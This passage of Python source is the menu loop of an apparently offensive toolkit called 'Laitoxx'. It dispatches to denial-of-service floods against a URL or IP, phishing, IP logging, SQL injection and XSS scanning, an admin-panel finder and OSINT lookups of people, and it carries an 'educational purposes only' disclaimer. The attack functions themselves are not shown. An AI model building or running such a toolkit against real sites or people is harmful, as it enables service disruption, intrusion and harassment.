    prompt_text = f"""{Color.DARK_GRAY}╭───({Color.DARK_RED}admin@laitoxx{Color.DARK_GRAY})─[{Color.DARK_RED}~/Laitoxx/main_menu{Color.DARK_GRAY}]
╰──{Color.DARK_RED}$ {Color.DARK_RED}"""
    final_prompt = f"{prompt_text}"

    select = input(final_prompt)
    if select == '>':
        os.system('cls' if os.name == 'nt' else 'clear')
        print(banner2)
        select = input(final_prompt)
    elif select == '66':
        break
    elif select == '1':
        search_by_number()
        input(
            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}Press Enter.....")
    elif select == '3':
        email = input(
            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}Enter email address: ")
        print(check_email_address(email))
        input(
            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}Press Enter.....")
    elif select == '2':
        get_ip()
        input(
            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}Press Enter.....")
    elif select == '4':
        print(f"""{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}The author is not responsible for users. The software was created for educational purposes only. All sources are public and the author has no relation to them.
COLOR - Changing the software theme
""")
        print("Thank you for choosing us!")
        input(
            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}Press Enter.....")
    elif select == '5':
        print(f"""{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}I would be grateful if you could donate for some dumplings <3
        @send (telegram bot):t.me/send?start=IV1xARFXeILV
        """)
        input(
            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}Press Enter.....")
    elif select == '6':
        domain = input(
            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Enter the website domain: {Color.RESET}")
        get_website_info(domain)
        input(
            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}Press Enter.....")

    elif select == '8':
        def transform_text(input_text):
            translit_dict = {
                "а": "@", "б": "Б", "в": "B", "г": "г", "д": "д", "е": "е", "ё": "ё", "ж": "ж", "з": "3",
                "и": "u", "й": "й", "к": "K", "л": "л", "м": "M", "н": "H", "о": "0", "п": "п", "р": "P",
                "с": "c", "т": "T", "у": "y", "ф": "ф", "х": "X", "ц": "ц", "ч": "4", "ш": "ш", "щ": "щ",
                "ъ": "ъ", "ы": "ы", "ь": "ь", "э": "э", "ю": "ю", "я": "я", "А": "A", "Б": "6", "В": "V",
                "Г": "r", "Д": "D", "Е": "E", "Ё": "Ё", "Ж": "Ж", "З": "2", "И": "I", "Й": "Й", "К": "K",
                "Л": "Л", "М": "M", "Н": "H", "О": "O", "П": "П", "Р": "P",
            }
            transformed_text = []
            for char in input_text:
                if char in translit_dict:
                    transformed_text.append(translit_dict[char])
                else:
                    transformed_text.append(char)
            return "".join(transformed_text)

        input_text = input(f"{Color.DARK_RED}Enter text: {Color.DARK_RED}")
        transformed_text = transform_text(input_text)
        print(
            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Result: {transformed_text}{Color.RESET}")
        input(
            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Press Enter.....{Color.RESET}")

    if select == '9':
        def get_characters(complexity):
            characters = string.ascii_letters + string.digits
            if complexity == "medium":
                characters += "!@#$%^&*()qwertyuiop[]{}asdfghjkl;'zxcvbnm<>?/|1234567890-_=+"
            elif complexity == "high":
                characters += string.punctuation
            return characters

        def generate_password(length, complexity):
            characters = get_characters(complexity)
            password = "".join(random.choice(characters)
                               for i in range(length))
            return password

        password_length = int(input(
            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}Enter password length -> "))
        complexity = input(
            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}Choose complexity (low, medium, high): ")
        print()
        complex_password = generate_password(password_length, complexity)
        print(
            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}Password: {complex_password}")
        input(
            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}Press Enter.....")

    if select == '10':
        print(
            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}Choose mode: ")
        print(
            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}1 - Check commonly used ports")
        print(
            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}2 - Check specific port")
        mode = input(
            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}Your choice: ")
        if mode == '1':
            print()
            ports = [
                20, 26, 28, 29, 55, 53, 80, 110, 443, 8080, 1111, 1388, 2222, 1020, 4040, 6035
            ]
            for port in ports:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                result = sock.connect_ex(("127.0.0.1", port))
                if result == 0:
                    print(
                        f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}Port {port} is open")
                else:
                    print(
                        f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}Port {port} is closed")
                sock.close()
                print()
        elif mode == '2':
            port = input(
                f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}Enter port number: ")
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            result = sock.connect_ex(("127.0.0.1", int(port)))
            print()
            if result == 0:
                print(
                    f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}Port {port} is open")
            else:
                print(
                    f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}Port {port} is closed")
            sock.close()
            print()
        else:
            print(
                f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}Unknown mode")
            print()
            input(
                f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}Press Enter.....")
    elif select == '11':
        temp_mail()
    elif select == '12':
        gmail_osint()
        input(
            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}Press Enter.....")
    elif select == '13':
        search_database()
        input(
            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}Press Enter.....")
    elif select == '14':
        proxies = get_proxy()
        if proxies:
            print(
                f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{LIGHT_RED} Proxy list:")
            for proxy in proxies:
                print(
                    f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{LIGHT_RED} {proxy}")
        else:
            print(
                f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} No proxy list available.")
        input(
            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{LIGHT_RED} Press Enter...")
    elif select == '15':
        check_site()
    elif select == '16':
        link = input(
            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Enter the link: {Color.RESET}")
        duration = int(input(
            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Enter duration in minutes: {Color.RESET}"))
        threads = int(input(
            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Enter number of threads: {Color.RESET}"))
        dos_attack(link, duration, threads)
        input(
            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{LIGHT_RED} Press Enter...")
    elif select == '17':
        ip_address = input(
            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Enter the IP address: {Color.RESET}")
        duration = int(input(
            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Enter duration in minutes: {Color.RESET}"))
        threads = int(input(
            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Enter number of threads: {Color.RESET}"))
        dos_ip(ip_address, duration, threads)
        input(
            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{LIGHT_RED} Press Enter...")
    elif select == '18':
        url = input(
            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Enter the URL to check for redirects: {Color.RESET}")
        check_url(url)
        input(
            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{LIGHT_RED} Press Enter...")
    elif select == '19':
        url = input(
            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Enter the URL to scan for XSS: {Color.RESET}")
        xss_scan()
        input(
            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{LIGHT_RED} Press Enter...")
    elif select == '20':
        mac_address = input(
            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Enter the MAC address to search: {Color.RESET}")
        search_mac_address(mac_address)
        input(
            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{LIGHT_RED} Press Enter...")
    elif select == 'COLOR':
        print(
            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Select Color Scheme: ")
        print(
            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} 1 - Green")
        print(
            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} 2 - Blue")
        print(
            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} 3 - Purple")
        print(
            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} 4 - Yellow")
        print(
            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} 5 - Cyan")
        print(
            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} 6 - Grayscale")
        scheme_choice = input(
            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Your choice: ")
        if scheme_choice == '1':
            change_color_scheme('green')
        elif scheme_choice == '2':
            change_color_scheme('blue')
        elif scheme_choice == '3':
            change_color_scheme('purple')
        elif scheme_choice == '4':
            change_color_scheme('yellow')
        elif scheme_choice == '5':
            change_color_scheme('cyan')
        elif scheme_choice == '6':
            change_color_scheme('grayscale')
        print(
            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Color scheme updated.")
    elif select == '21':
        find_admin_panel()
        input(
            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{LIGHT_RED} Press Enter...")
    elif select == '22':
        payload_type = input(
            f"{Color.LIGHT_BLUE}Enter payload type (scan/injection): {Color.RESET}").strip().lower()
        if payload_type not in ['scan', 'injection']:
            print(
                f"{Color.RED}Invalid payload type! Choose from 'scan' or 'injection'.{Color.RESET}")
        payload_type += '_payload'
        try:
            sql_injection_scanner(payload_type)
        except Exception as e:
            print(
                f"{Color.RED}An error occurred during the SQL injection scan: {e}{Color.RESET}")
        input(
            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} Press Enter...")
    elif select == '23':
        find_subdomains()
    elif select == '24':
        logger_ip()
    elif select == '25':
        google_osint()
        input(
            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{LIGHT_RED} Press Enter...")
    elif select == '26':
        telegram_search()
    elif select == '27':
        check_username()
        input(
            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{LIGHT_RED} Press Enter...")
    elif select == '28':
        obfuscate_tool()
        input(
            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{LIGHT_RED} Press Enter...")
    elif select == '29':
        web_crawler()
        input(
            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{LIGHT_RED} Press Enter...")
    elif select == '30':
        phishing()
